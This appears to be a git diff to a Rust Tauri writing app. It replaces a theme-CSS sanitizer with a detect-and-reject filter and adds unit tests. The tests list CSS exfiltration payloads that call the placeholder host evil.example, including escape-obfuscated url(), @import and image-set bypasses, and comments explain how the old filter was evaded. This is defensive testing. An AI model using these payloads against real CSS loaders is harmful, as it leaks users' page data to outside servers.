@@ -201,288 +201,18 @@ fn load_locales(app: tauri::AppHandle) -> Result<serde_json::Value, String> {
         std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
     }
 
-    // Default translations
-    let zh_hant_json = r#"{
-  "languageName": "正體中文",
-  "ui": {
-    "new": "新增",
-    "open": "開啟",
-    "codex": "冊",
-    "save": "儲存",
-    "export": "匯出",
-    "exportHtml": "匯出 HTML",
-    "exportPdf": "匯出 PDF",
-    "toc": "目錄",
-    "fullscreen": "全螢幕",
-    "exitFullscreen": "退出全螢幕",
-    "writeMode": "撰",
-    "splitMode": "參",
-    "readMode": "閱",
-    "writeModeDesc": "撰：沉浸寫作",
-    "splitModeDesc": "參：邊寫邊對照",
-    "readModeDesc": "閱：閱讀",
-    "recentFiles": "最近檔案",
-    "switchCodex": "切換冊",
-    "openCodexFolder": "開啟冊資料夾",
-    "chars": "字數",
-    "lines": "行數",
-    "render": "渲染",
-    "charsUnit": "字",
-    "linesUnit": "行",
-    "msUnit": "ms",
-    "saved": "已儲存",
-    "unsaved": "未儲存",
-    "unsavedSeal": "未存",
-    "language": "語言",
-    "codexDesc": "冊：資料夾檔案樹",
-    "exportDesc": "匯出選項",
-    "themeDesc": "切換佈景主題",
-    "modeSwitchDesc": "寫作模式",
-    "charsAlt": "ALT",
-    "linesAlt": "HDG",
-    "renderAlt": "ETA",
-    "openLocalesFolder": "開啟語言包資料夾",
-    "importCodexFolder": "匯入冊資料夾",
-    "deleteCodex": "刪除冊"
-  },
-  "dialogs": {
-    "openCodexErrorTitle": "開啟冊失敗",
-    "openCodexErrorMessage": "無法開啟資料夾。",
-    "importCodexErrorTitle": "匯入冊失敗",
-    "importCodexErrorMessage": "無法匯入資料夾。",
-    "deleteCodexConfirmTitle": "刪除冊",
-    "deleteCodexConfirmMessage": "確定要將冊「{name}」從選單中移除嗎？這不會刪除您硬碟上的實際資料夾。",
-    "switchCodexErrorTitle": "開啟冊失敗",
-    "switchCodexErrorMessage": "無法開啟此冊，可能已移動、刪除，或需重新授權；請用「開啟冊」重新選取。",
-    "deleteNonExistentCodexTitle": "此冊已不存在",
-    "deleteNonExistentCodexMessage": "此冊「{name}」可能已被移動或刪除。是否將其從下拉選單中移除？",
-    "deleteLabel": "刪除",
-    "unsavedChangesTitle": "未儲存的變更",
-    "unsavedChangesMessage": "「{file}」有未儲存的變更，要儲存嗎？",
-    "saveLabel": "儲存",
-    "dontSaveLabel": "不儲存",
-    "discardChangesTitle": "放棄變更",
-    "discardChangesMessage": "確定放棄未儲存的變更？",
-    "discardLabel": "放棄變更",
-    "cancelLabel": "取消",
-    "saveFailedTitle": "儲存失敗",
-    "saveFailedMessage": "儲存失敗：{error}",
-    "openFailedTitle": "開啟失敗",
-    "openFailedMessage": "無法開啟檔案：{error}",
-    "copyFailedTitle": "複製失敗",
-    "copyFailedMessage": "複製失敗：{error}",
-    "exportFailedTitle": "匯出失敗",
-    "exportFailedMessage": "匯出失敗：{error}",
-    "exportPdfFailedTitle": "匯出失敗",
-    "exportPdfFailedMessage": "匯出 PDF 失敗：{error}",
-    "renderErrorMessage": "渲染發生錯誤（下次輸入會自動重試）：{error}"
-  },
-  "menu": {
-    "file": "檔案",
-    "new": "新增",
-    "open": "開啟…",
-    "openCodex": "開啟冊資料夾…",
-    "save": "儲存",
-    "saveAs": "另存新檔…",
-    "exportHtml": "匯出 HTML…",
-    "exportPdf": "匯出 PDF…",
-    "edit": "編輯",
-    "undo": "復原",
-    "redo": "重做",
-    "cut": "剪下",
-    "copy": "複製",
-    "paste": "貼上",
-    "selectAll": "全選",
-    "view": "檢視",
-    "focusMode": "專注模式",
-    "typewriterMode": "打字機模式",
-    "theme": "佈景主題",
-    "readingFont": "閱讀字型",
-    "fontSize": "字型大小",
-    "fontIncrease": "放大",
-    "fontDecrease": "縮小",
-    "fontReset": "重設",
-    "toc": "目錄",
-    "fullscreen": "全螢幕閱讀",
-    "copyHtml": "複製為 HTML",
-    "help": "輔助說明",
-    "shortcuts": "鍵盤快捷鍵",
-    "compose": "Compose",
-    "split": "Split",
-    "read": "Read",
-    "themeVolDeNuit": "暗夜飛行",
-    "themeInkstone": "硯台",
-    "themeAuto": "自動",
-    "fontDefault": "預設",
-    "fontSerif": "襯線體",
-    "fontSans": "無襯線體",
-    "fontMono": "等寬體"
-  },
-  "shortcuts": {
-    "fileGroup": "檔案",
-    "newFile": "新增檔案",
-    "openFile": "開啟檔案",
-    "save": "儲存",
-    "saveAs": "另存新檔",
-    "exportPdf": "匯出 PDF",
-    "viewGroup": "檢視",
-    "toggleEditRead": "切換編輯／閱讀",
-    "fontGroup": "字型",
-    "increaseFont": "放大字型",
-    "decreaseFont": "縮小字型",
-    "resetFont": "重設字型大小",
-    "toolsGroup": "工具",
-    "copyHtml": "複製為 HTML",
-    "exitFullscreen": "退出全螢幕",
-    "shortcutsTip": "快捷鍵提示",
-    "overlayTitle": "Keyboard Shortcuts"
-  }
-}"#;
-
-    let en_json = r#"{
-  "languageName": "English",
-  "ui": {
-    "new": "New",
-    "open": "Open",
-    "codex": "Codex",
-    "save": "Save",
-    "export": "Export",
-    "exportHtml": "Export HTML",
-    "exportPdf": "Export PDF",
-    "toc": "TOC",
-    "fullscreen": "Fullscreen",
-    "exitFullscreen": "Exit Fullscreen",
-    "writeMode": "Write",
-    "splitMode": "Split",
-    "readMode": "Read",
-    "writeModeDesc": "Write: Immersive mode",
-    "splitModeDesc": "Split: Compare mode",
-    "readModeDesc": "Read: Reading mode",
-    "recentFiles": "Recent Files",
-    "switchCodex": "Switch Codex",
-    "openCodexFolder": "Open Codex Folder",
-    "chars": "Chars",
-    "lines": "Lines",
-    "render": "Render",
-    "charsUnit": " chars",
-    "linesUnit": " lines",
-    "msUnit": "ms",
-    "saved": "Saved",
-    "unsaved": "Unsaved",
-    "unsavedSeal": "Dirty",
-    "language": "Language",
-    "codexDesc": "Codex: folder tree",
-    "exportDesc": "Export options",
-    "themeDesc": "Switch theme",
-    "modeSwitchDesc": "Writing mode",
-    "charsAlt": "ALT",
-    "linesAlt": "HDG",
-    "renderAlt": "ETA",
-    "openLocalesFolder": "Open Locales Folder",
-    "importCodexFolder": "Import Codex Folder",
-    "deleteCodex": "Delete Codex"
-  },
-  "dialogs": {
-    "openCodexErrorTitle": "Open Codex Failed",
-    "openCodexErrorMessage": "Cannot open folder.",
-    "importCodexErrorTitle": "Import Codex Failed",
-    "importCodexErrorMessage": "Cannot import folder.",
-    "deleteCodexConfirmTitle": "Delete Codex",
-    "deleteCodexConfirmMessage": "Are you sure you want to remove the codex '{name}' from the menu? This will not delete the folder on your hard drive.",
-    "switchCodexErrorTitle": "Open Codex Failed",
-    "switchCodexErrorMessage": "Cannot open this codex, it might have been moved, deleted, or needs re-authorization. Please use 'Open Codex Folder' to re-select.",
-    "deleteNonExistentCodexTitle": "Codex Does Not Exist",
-    "deleteNonExistentCodexMessage": "This codex '{name}' might have been moved or deleted. Do you want to remove it from the menu?",
-    "deleteLabel": "Delete",
-    "unsavedChangesTitle": "Unsaved Changes",
-    "unsavedChangesMessage": "\"{file}\" has unsaved changes. Do you want to save them?",
-    "saveLabel": "Save",
-    "dontSaveLabel": "Don't Save",
-    "discardChangesTitle": "Discard Changes",
-    "discardChangesMessage": "Are you sure you want to discard unsaved changes?",
-    "discardLabel": "Discard Changes",
-    "cancelLabel": "Cancel",
-    "saveFailedTitle": "Save Failed",
-    "saveFailedMessage": "Save failed: {error}",
-    "openFailedTitle": "Open Failed",
-    "openFailedMessage": "Cannot open file: {error}",
-    "copyFailedTitle": "Copy Failed",
-    "copyFailedMessage": "Copy failed: {error}",
-    "exportFailedTitle": "Export Failed",
-    "exportFailedMessage": "Export failed: {error}",
-    "exportPdfFailedTitle": "Export Failed",
-    "exportPdfFailedMessage": "Export PDF failed: {error}",
-    "renderErrorMessage": "Render error (will retry automatically on next input): {error}"
-  },
-  "menu": {
-    "file": "File",
-    "new": "New",
-    "open": "Open…",
-    "openCodex": "Open Codex Folder…",
-    "save": "Save",
-    "saveAs": "Save As…",
-    "exportHtml": "Export HTML…",
-    "exportPdf": "Export PDF…",
-    "edit": "Edit",
-    "undo": "Undo",
-    "redo": "Redo",
-    "cut": "Cut",
-    "copy": "Copy",
-    "paste": "Paste",
-    "selectAll": "Select All",
-    "view": "View",
-    "focusMode": "Focus Mode",
-    "typewriterMode": "Typewriter Mode",
-    "theme": "Theme",
-    "readingFont": "Reading Font",
-    "fontSize": "Font Size",
-    "fontIncrease": "Increase",
-    "fontDecrease": "Decrease",
-    "fontReset": "Reset",
-    "toc": "Table of Contents",
-    "fullscreen": "Fullscreen Reading",
-    "copyHtml": "Copy as HTML",
-    "help": "Help",
-    "shortcuts": "Keyboard Shortcuts",
-    "compose": "Compose",
-    "split": "Split",
-    "read": "Read",
-    "themeVolDeNuit": "Night Flight",
-    "themeInkstone": "Inkstone",
-    "themeAuto": "Auto",
-    "fontDefault": "Default",
-    "fontSerif": "Serif",
-    "fontSans": "Sans-serif",
-    "fontMono": "Monospace"
-  },
-  "shortcuts": {
-    "fileGroup": "File",
-    "newFile": "New File",
-    "openFile": "Open File",
-    "save": "Save",
-    "saveAs": "Save As",
-    "exportPdf": "Export PDF",
-    "viewGroup": "View",
-    "toggleEditRead": "Toggle Edit/Read",
-    "fontGroup": "Font",
-    "increaseFont": "Increase Font Size",
-    "decreaseFont": "Decrease Font Size",
-    "resetFont": "Reset Font Size",
-    "toolsGroup": "Tools",
-    "copyHtml": "Copy as HTML",
-    "exitFullscreen": "Exit Fullscreen",
-    "shortcutsTip": "Shortcuts Helper",
-    "overlayTitle": "Keyboard Shortcuts"
-  }
-}"#;
+    // 翻譯真相唯一來源是 repo 的 locales/*.json（前端 i18n.ts 亦 import 同一組檔案，
+    // 編譯期內嵌保證兩端同步）。此處只在使用者語言包不存在時種下初始檔。
+    const ZH_HANT_JSON: &str = include_str!("../../locales/zh_Hant.json");
+    const EN_JSON: &str = include_str!("../../locales/en.json");
 
     let zh_hant_path = locales_dir.join("zh_Hant.json");
     if !zh_hant_path.exists() {
-        let _ = std::fs::write(&zh_hant_path, zh_hant_json);
+        let _ = std::fs::write(&zh_hant_path, ZH_HANT_JSON);
     }
     let en_path = locales_dir.join("en.json");
     if !en_path.exists() {
-        let _ = std::fs::write(&en_path, en_json);
+        let _ = std::fs::write(&en_path, EN_JSON);
     }
 
     // Read all JSON files in the locales directory
@@ -528,28 +258,9 @@ fn open_locales_dir(app: tauri::AppHandle) -> Result<(), String> {
     if !locales_dir.exists() {
         std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
     }
-    #[cfg(target_os = "macos")]
-    {
-        std::process::Command::new("open")
-            .arg(&locales_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "windows")]
-    {
-        std::process::Command::new("explorer")
-            .arg(&locales_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "linux")]
-    {
-        std::process::Command::new("xdg-open")
-            .arg(&locales_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    Ok(())
+    // free function 收 AsRef<Path>，保留原始 path bytes；OpenerExt::open_path
+    // 的簽名是 Into<String>，非 UTF-8 路徑會被 lossy 轉換成開不到的路徑。
+    tauri_plugin_opener::open_path(&locales_dir, None::<&str>).map_err(|e| e.to_string())
 }
 
 #[derive(serde::Serialize, serde::Deserialize, Clone, Debug)]
@@ -561,44 +272,214 @@ pub struct CustomTheme {
     pub file_path: String,
 }
 
-// Strip external url() references from theme CSS to prevent CSS exfiltration
-// (attribute selectors + background-image can leak DOM data to attacker servers).
-// Only data: URIs are allowed; @import is stripped entirely.
+// 自訂主題 CSS 的外連防線：偵測到任何外部資源參照就整份拒絕（回傳空字串），
+// 乾淨的主題則原文原樣輸出。
+//
+// 為何是「偵測 + 拒絕」而非「就地清除」：清除要求本函式對 CSS 的理解與瀏覽器
+// tokenizer 完全一致，任何落差都是繞過。前一版就地改寫的實作被四種形式穿透
+// （註解前綴 @import、\75 rl()、\5c 75 二階 escape、單斜線 https:/host），
+// 且改寫本身會破壞合法 CSS（content: "\22" 被解成裸引號後打亂字串邊界）。
+// 改為偵測後，判斷失準只會偏向「誤判為可疑 → 拒絕載入」，方向是安全的。
+//
+// 這是 best-effort 的深度防禦，不是安全邊界：CSP 的 img-src 含萬用 `https:`
+// （Markdown 外部圖片所需），故此函式是自訂主題外連的唯一防線。
 fn sanitize_theme_css(css: &str) -> String {
-    let mut result = String::with_capacity(css.len());
+    if has_external_reference(css) {
+        String::new()
+    } else {
+        css.to_string()
+    }
+}
+
+// 已知會觸發外部請求的 scheme。判定在解碼後的分析視圖上做，故 escape 偽裝無效。
+const EXTERNAL_SCHEMES: [&str; 6] = ["http:", "https:", "ftp:", "ws:", "wss:", "file:"];
+
+fn has_external_reference(css: &str) -> bool {
+    let decoded = decode_css_escapes_to_fixpoint(&strip_css_comments(css)).to_ascii_lowercase();
+    let view = elide_data_uris(&decoded);
+
+    if view.contains("@import") {
+        return true;
+    }
+    // 涵蓋 protocol-relative（//host/path）
+    if view.contains("//") {
+        return true;
+    }
+    if EXTERNAL_SCHEMES.iter().any(|s| view.contains(s)) {
+        return true;
+    }
+    // url() 內容帶任何 scheme 即拒絕（涵蓋清單外的協定）。相對／同源絕對路徑
+    // 受 CSP default-src 'self' 侷限，不構成外連，予以放行。
+    let mut rest = view.as_str();
+    while let Some(pos) = rest.find("url(") {
+        let after = &rest[pos + 4..];
+        let Some(end) = after.find(')') else {
+            return true; // 未閉合的 url( — 無法判定，保守拒絕
+        };
+        let inner = after[..end].trim().trim_matches(|c: char| c == '"' || c == '\'');
+        if inner.contains(':') {
+            return true;
+        }
+        rest = &after[end..];
+    }
+    false
+}
+
+// data: URI 不會外連，但其內容常含 SVG 命名空間 http://www.w3.org/2000/svg 等字面，
+// 會誤觸上方的 scheme 偵測（內建 Office 97 主題就是這樣被誤殺的）。偵測前先剔除。
+//
+// data:image/svg+xml 內嵌的 <image href> / <use href> 已實測確認被瀏覽器阻擋
+// （SVG 作為 background-image 處於 secure static mode），故不需再對 MIME 分類。
+//
+// 邊界抓錯只會讓更多內容留在視圖裡 → 更容易判為可疑 → 偏保守，不是安全缺口。
+fn elide_data_uris(css: &str) -> String {
+    let mut out = String::with_capacity(css.len());
     let mut chars = css.char_indices().peekable();
 
-    while let Some(&(i, _)) = chars.peek() {
-        let is_url = css.get(i..i + 4).map(|s| s.eq_ignore_ascii_case("url(")).unwrap_or(false);
-        if is_url {
-            result.push_str("url(");
-            for _ in 0..4 { chars.next(); }
-            let mut inside = String::new();
+    while let Some(&(i, c)) = chars.peek() {
+        // url(...)：以括號配對取內容，是 data: 就整段剔除
+        if css.get(i..i + 4).is_some_and(|s| s.eq_ignore_ascii_case("url(")) {
+            for _ in 0..4 {
+                chars.next();
+            }
+            let mut inner = String::new();
             let mut depth = 1;
-            while let Some((_, c)) = chars.next() {
-                if c == ')' { depth -= 1; if depth == 0 { break; } }
-                if c == '(' { depth += 1; }
-                inside.push(c);
+            for (_, ch) in chars.by_ref() {
+                if ch == ')' {
+                    depth -= 1;
+                    if depth == 0 {
+                        break;
+                    }
+                }
+                if ch == '(' {
+                    depth += 1;
+                }
+                inner.push(ch);
             }
-            let trimmed = inside.trim().trim_matches(|c: char| c == '"' || c == '\'');
-            if trimmed.is_empty() || trimmed.starts_with("data:") {
-                result.push_str(&inside);
+            let probe = inner.trim().trim_matches(|c: char| c == '"' || c == '\'');
+            out.push_str("url(");
+            if !probe.starts_with("data:") {
+                out.push_str(&inner);
             }
-            result.push(')');
-        } else {
-            let (_, c) = chars.next().unwrap();
-            result.push(c);
+            out.push(')');
+            continue;
+        }
+        // 引號字串：以配對的同類引號為界（data: 內部的異類引號不會誤斷）
+        if c == '"' || c == '\'' {
+            let quote = c;
+            chars.next();
+            let mut inner = String::new();
+            for (_, ch) in chars.by_ref() {
+                if ch == quote {
+                    break;
+                }
+                inner.push(ch);
+            }
+            out.push(quote);
+            if !inner.trim_start().starts_with("data:") {
+                out.push_str(&inner);
+            }
+            out.push(quote);
+            continue;
+        }
+        chars.next();
+        out.push(c);
+    }
+    out
+}
+
+// 移除 /* */ 註解。字串內的 /* 不算註解，故需追蹤引號狀態。
+// 註解替換為空白而非直接刪除，避免 `a/**/b` 黏合成新 token。
+fn strip_css_comments(css: &str) -> String {
+    let mut out = String::with_capacity(css.len());
+    let mut chars = css.chars().peekable();
+    let mut in_string: Option<char> = None;
+
+    while let Some(c) = chars.next() {
+        match in_string {
+            Some(quote) => {
+                out.push(c);
+                if c == '\\' {
+                    if let Some(escaped) = chars.next() {
+                        out.push(escaped);
+                    }
+                } else if c == quote {
+                    in_string = None;
+                }
+            }
+            None => {
+                if c == '/' && chars.peek() == Some(&'*') {
+                    chars.next();
+                    let mut prev = '\0';
+                    for cur in chars.by_ref() {
+                        if prev == '*' && cur == '/' {
+                            break;
+                        }
+                        prev = cur;
+                    }
+                    out.push(' ');
+                } else {
+                    if c == '"' || c == '\'' {
+                        in_string = Some(c);
+                    }
+                    out.push(c);
+                }
+            }
         }
     }
+    out
+}
 
-    result.lines()
-        .filter(|line| {
-            let stripped = line.trim_start();
-            let without_comments = stripped.trim_start_matches(|c: char| c == '/' || c == '*' || c.is_whitespace());
-            !without_comments.get(..7).map(|s| s.eq_ignore_ascii_case("@import")).unwrap_or(false)
-        })
-        .collect::<Vec<_>>()
-        .join("\n")
+// 反覆解碼直到不再變化：單次解碼擋不住二階 escape（`\5c 75 rl(` 解一次得
+// `\75 rl(`，瀏覽器自己會再解一次還原成 `url(`）。迭代上限防病態輸入。
+fn decode_css_escapes_to_fixpoint(css: &str) -> String {
+    let mut current = css.to_string();
+    for _ in 0..8 {
+        let next = decode_css_escapes_once(&current);
+        if next == current {
+            break;
+        }
+        current = next;
+    }
+    current
+}
+
+// `\` + 1-6 hex（可跟一個終止空白）→ 該 code point；`\` + 其他字元 → 該字元。
+// 只用於產生分析視圖，不影響輸出，故不必顧慮字串邊界是否被破壞。
+fn decode_css_escapes_once(css: &str) -> String {
+    let mut out = String::with_capacity(css.len());
+    let mut chars = css.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        if c != '\\' {
+            out.push(c);
+            continue;
+        }
+        let mut hex = String::new();
+        while hex.len() < 6 {
+            match chars.peek() {
+                Some(h) if h.is_ascii_hexdigit() => {
+                    hex.push(*h);
+                    chars.next();
+                }
+                _ => break,
+            }
+        }
+        if hex.is_empty() {
+            if let Some(literal) = chars.next() {
+                out.push(literal);
+            }
+        } else {
+            // CSS 規範：hex escape 後的單一空白是終止符，不是內容
+            if chars.peek().is_some_and(|c| c.is_whitespace()) {
+                chars.next();
+            }
+            if let Some(decoded) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
+                out.push(decoded);
+            }
+        }
+    }
+    out
 }
 
 fn parse_theme_name(content: &str, default_id: &str) -> String {
@@ -823,28 +704,7 @@ fn open_themes_dir(app: tauri::AppHandle) -> Result<(), String> {
     if !themes_dir.exists() {
         std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
     }
-    #[cfg(target_os = "macos")]
-    {
-        std::process::Command::new("open")
-            .arg(&themes_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "windows")]
-    {
-        std::process::Command::new("explorer")
-            .arg(&themes_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "linux")]
-    {
-        std::process::Command::new("xdg-open")
-            .arg(&themes_dir)
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    Ok(())
+    tauri_plugin_opener::open_path(&themes_dir, None::<&str>).map_err(|e| e.to_string())
 }
 
 #[tauri::command]
@@ -1006,4 +866,112 @@ pub fn run() {
             let _ = app_handle.emit("file-open", &paths);
         }
     });
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // 每一條都是實測確認過會發出真實外連請求的形式（2026-07-26 取證，
+    // 瀏覽器引擎 + 本地 server 收證）。CSP 的 img-src 含萬用 `https:`，擋不住這些。
+    #[test]
+    fn rejects_proven_exfiltration_payloads() {
+        let payloads = [
+            // 直接形式
+            r#"@import "https://evil.example/x.css";"#,
+            r#"body { background: url("https://evil.example/leak.png"); }"#,
+            r#"body { background: url(//evil.example/leak.png); }"#,
+            // 註解前綴讓 @import 躲過行首比對
+            r#"/*x*/@import "https://evil.example/x.css";"#,
+            r#"/*a*/ @import "https://evil.example/x.css";"#,
+            // escape 偽裝 url()
+            r#"body { background: \75 rl("https://evil.example/leak.png"); }"#,
+            // 二階 escape：解一次得 \75 rl(，瀏覽器自己會再解一次
+            r#"body { background: \5c 75 rl(https://evil.example/leak.png); }"#,
+            r#"@\69mport "https:\2f\2fevil.example/hack.css";"#,
+            // image-set 系列不含 "url(" 字面
+            r#"body { background-image: image-set("https://evil.example/is.png" 1x); }"#,
+            r#"body { background-image: -webkit-image-set("https://evil.example/w.png" 1x); }"#,
+            r#"body { background-image: image-set("//evil.example/x.png" 1x); }"#,
+            // WHATWG special scheme：斜線數量寬鬆，1 個甚至 0 個都會解析成 host
+            r#"body{background-image:-webkit-image-set("https:/evil.example/w.png" 1x)}"#,
+            r#"body{background-image:image-set("https:evil.example/w.png" 1x)}"#,
+            // 引號脫序：\22 解成裸引號後，舊實作的字串邊界全亂
+            r#"body { content: "\22"; background-image: image-set("https://evil.example/y.png"); }"#,
+            // 未閉合引號，連 escape 技巧都不需要
+            "a{content:\"oops}\nb{background:url(\"https://evil.example/x.png\")}",
+            // data: 掩護後夾帶
+            r#"body { background: url("data:image/png;base64,AA"), url("https://evil.example/x.png"); }"#,
+            r#"body { background-image: image-set("data:image/png;base64,AA" 1x, "https://evil.example/x.png" 2x); }"#,
+            // 其他載入函式
+            r#"@font-face { font-family: x; src: url("https://evil.example/f.woff2"); }"#,
+            r#"body { background-image: cross-fade(url("https://evil.example/a.png"), url(b.png)); }"#,
+        ];
+        for payload in payloads {
+            let out = sanitize_theme_css(payload);
+            assert!(
+                !out.contains("evil.example"),
+                "payload 未被擋下:\n  輸入: {payload}\n  輸出: {out}"
+            );
+        }
+    }
+
+    // 新實作不改寫乾淨的 CSS——這正是舊版就地改寫做不到的（它會把
+    // content: "a\22 b" 毀成 content: "a"b"）。斷言原文全等，不是「包含某片段」。
+    #[test]
+    fn passes_legitimate_css_through_untouched() {
+        let cases = [
+            r#"html[data-theme="x"] { --bg: #0d1b1e; --fg: #e0ece4; }"#,
+            r#"html { --font-ui: "JetBrains Mono", ui-monospace, monospace; }"#,
+            "body { background: radial-gradient(1.5px 1.5px at 70% 8%, rgba(78,204,163,0.35), transparent 60%), var(--bg); }",
+            r#"body { background: url("data:image/svg+xml;base64,PHN2Zy8+"); }"#,
+            // 合法 escape：舊版會破壞語法，新版原樣保留
+            r#"body { content: "a\22 b"; }"#,
+            "/* Theme Name: 翠綠森林 */\nhtml { --bg: #000; }",
+            // 相對路徑不構成外連（CSP default-src 'self' 侷限）
+            r#"body { background: url("bg.png"); }"#,
+        ];
+        for css in cases {
+            assert_eq!(sanitize_theme_css(css), css, "合法 CSS 被改動或拒絕");
+        }
+    }
+
+    // inline SVG data: URI 內含 xmlns='http://www.w3.org/2000/svg'，是 SVG 規範
+    // 強制要求的字面，不是外連。內建 Office 97 主題就是這個形式——若誤判，
+    // 整個主題會變空白。
+    #[test]
+    fn does_not_reject_inline_svg_namespace() {
+        let css = "body { background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16'%3E%3C/svg%3E\"); }";
+        assert_eq!(sanitize_theme_css(css), css);
+    }
+
+    // 內建模板是使用者「複製為範本」的起點，必須原樣通過。
+    #[test]
+    fn builtin_templates_pass_through_unchanged() {
+        for (name, template) in [
+            ("emerald", TEMPLATE_EMERALD_FOREST),
+            ("nordic", TEMPLATE_NORDIC_FROST),
+            ("office97", TEMPLATE_OFFICE_97),
+        ] {
+            assert_eq!(
+                sanitize_theme_css(template),
+                template,
+                "{name} 被 sanitizer 改動或拒絕"
+            );
+        }
+    }
+
+    #[test]
+    fn theme_name_survives_comment_stripping() {
+        // parse_theme_name 讀原始檔（非淨化後），此測試確認兩者職責未混淆
+        let raw = "/* Theme Name: 翠綠森林 */\nhtml { --bg: #000; }";
+        assert_eq!(parse_theme_name(raw, "fallback"), "翠綠森林");
+    }
+
+    #[test]
+    fn escape_decoding_reaches_fixpoint() {
+        // \5c 5c 75 → 連續解碼後仍應收斂，不可無限迴圈或提早放棄
+        let nested = r#"body { background: \5c 5c 75 rl(https://evil.example/x.png); }"#;
+        assert!(!sanitize_theme_css(nested).contains("evil.example"));
+    }
 }
